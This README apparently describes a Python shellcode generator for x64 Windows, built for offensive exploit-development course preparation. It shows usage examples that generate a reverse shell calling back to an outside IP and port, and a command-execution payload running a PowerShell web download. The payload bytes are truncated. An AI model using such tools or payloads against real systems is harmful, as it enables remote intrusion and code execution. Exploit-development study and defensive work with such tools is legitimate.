# Win-x64-Shellcoder
 An x64 shellcode generator made as part of OSEE/EXP-401 prep

```
C:\>python shellcoder.py
usage: shellcoder.py [-h] -t {winexec,msgbox,revshell} [-c COMMAND] [-s STRING] [-lh LHOST] [-lp LPORT]
                     [-sh {cmd,pwsh}]

C:\>python shellcoder.py -t revshell -lh 192.168.133.123 -lp 443 -sh cmd
Shellcode: revshell
Length: 517 Bytes
\x48\x31\xd2\x65\x48......

C:\>python shellcoder.py -t msgbox -s "My Message"
Shellcode: msgbox
Length: 320 Bytes
\x48\x31\xd2\x65\x48......

C:\>python shellcoder.py -t winexec -c "powershell.exe Invoke-WebRequest ..."
Shellcode: winexec
Length: 335 Bytes
\x48\x31\xd2\x65\x48......
```